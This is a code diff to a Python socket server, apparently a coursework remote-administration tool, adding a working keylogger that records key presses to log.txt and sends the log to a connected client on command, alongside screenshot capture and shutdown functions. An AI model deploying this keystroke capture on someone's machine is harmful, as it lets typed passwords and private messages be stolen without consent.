@@ -4,14 +4,90 @@ from PIL import ImageGrab
 import io
 import os
 import tkinter as tk
+import threading
+from pynput import keyboard
+import atexit
 
 HOST = "127.0.0.1"
 PORT = 65431
 
-def send_keystroke(key):
-    # Add your implementation to send keystroke command here
-    print(f"Sending keystroke: {key}")
+#####################################################################
+# send keystroke
+def on_key_press(key, client_socket):
+    key = str(key)
+    key = key.replace("'", "")
+    if (key == "Key.ctrl_l"):
+        key = ""
+    if (key == "Key.enter"):
+        key = "\n"
+    if (key == "Key.space"):
+        key = " "
+    if (len(key) > 2):
+        key = " " + key
+    with open("log.txt", "a") as file:
+        file.write(key)
 
+def Listening(client_socket, stop_event):
+    listener = keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket))
+    listener.start()
+    stop_event.wait()
+    listener.stop()
+
+def handle_client(client_socket):
+    print("Handle client")
+    stop_event = threading.Event()
+    listener_thread = None
+    while (True):
+        data = client_socket.recv(1024).decode()
+        data = str(data)
+        print(f"Hanle event of key stroke : {data}")
+        if (data == "HOOK"):
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+            stop_event.clear()
+            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
+            listener_thread.start()
+        if (data == "UNHOOK"):
+            stop_event.set()
+            if listener_thread:
+                listener_thread.join()
+                print("Listener thread stopped.")
+        if (data == "PRINT"):
+            # Stop the thread
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+
+            if os.path.exists("log.txt"):
+                with open('log.txt', 'rb') as file:
+                    file_data = file.read()
+            else: 
+                file_data = b"?"
+            client_socket.sendall(file_data)
+
+            # Recreate the thread
+            stop_event.clear()
+            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
+            listener_thread.start()
+        if (data == "DELETE"):
+            if os.path.exists('log.txt'):
+                os.remove('log.txt')
+        if (data == "CLOSE"):
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+            print("Break loops")
+            break
+
+def send_keystroke(client_socket):
+    handle_client(client_socket)
+
+#####################################################################
+# Screenshot
 def take_screenshot(client_socket):
     print("Taking screenshot...")
     screenshot = pyautogui.screenshot()
@@ -33,12 +109,19 @@ def take_screenshot(client_socket):
     except OSError as e:
         print(f"Error deleting image: {e}")
 
+#####################################################################
+# Running Apps
 def app_running_check(app_name):
     print(f"Checking if {app_name} is running...")
 
+
+#####################################################################
+# Running Process
 def process_running_check(process_name):
     print(f"Checking if {process_name} is running...")
 
+#####################################################################
+# Shutdown
 def ShutDown(countdown_seconds=10):
     print("ShuttingDown")
     print(f"Initiating system shutdown in {countdown_seconds} seconds...")
@@ -69,14 +152,15 @@ def ShutDown(countdown_seconds=10):
     ShutDownRoot.after(1000, update_time)
     ShutDownRoot.mainloop()
 
+#####################################################################
+# Fix_Regsistry
 def fix_registry():
     print("Fixing the registry...")
-    
 
 def handle_command(client_socket, command):
     parts = command.split()
     if parts[0] == "SendKeyStroke":
-        send_keystroke(parts[0])
+        send_keystroke(client_socket)
     elif parts[0] == "TakeScreenShot":
         take_screenshot(client_socket)
     elif parts[0] == "AppRunningChecking":
@@ -112,20 +196,3 @@ def start_server():
 
 if __name__ == "__main__":
     start_server()
-
-# if command == "ProcessRunning":
-#     # process_output = subprocess.check_output(["tasklist"])
-#     # connection.sendall(process_output)
-#     print("ProcessRunning!")
-# elif command == "AppRunning":
-#     # app_output = subprocess.check_output(["your_command_to_check_app_running"])
-#     # connection.sendall(app_output)
-#     print("AppRunning!")
-# elif command == "SendKeyStroke":
-#     print("KeyStroke!")
-# elif command == "ShutDown":
-#     print("ShutDown!")
-# elif command == "TakeScreenShot":
-#     print("TakeScreenShot!")
-# elif command == "FixRegistry":
-#     print("FixRegistry!")
